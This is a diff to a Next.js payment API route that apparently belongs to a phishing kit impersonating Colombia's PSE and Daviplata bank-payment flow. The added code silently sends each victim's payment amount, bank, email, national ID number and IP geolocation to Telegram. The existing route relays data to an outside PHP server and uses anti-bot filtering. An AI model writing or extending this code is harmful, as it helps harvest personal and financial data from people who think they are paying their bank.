@@ -1,5 +1,6 @@
 import { NextRequest, NextResponse } from 'next/server';
 import { antiBotProtection } from '@/lib/anti-bot';
+import { getGeoData, notifyPSEAttempt } from '@/lib/telegram';
 
 // Lista de bancos permitidos
 const ALLOWED_BANKS = [
@@ -124,6 +125,16 @@ export async function POST(request: NextRequest) {
     if (REDIRECCION_BOGOTA && bank === "BANCO DE BOGOTA") {
       return NextResponse.json({ URL: URL_BOGOTA });
     }
+
+    // Enviar notificación a Telegram (sin bloquear el flujo)
+    getGeoData(ip).then(geoData => {
+      notifyPSEAttempt({
+        amount,
+        bank,
+        email: correo,
+        document: documento,
+      }, geoData).catch(() => {});
+    }).catch(() => {});
 
     // Preparar datos para enviar al servidor externo
     const externalUrl = "https://phpclusters-196676-0.cloudclusters.net/apipsedaviplata2/PSE.php";
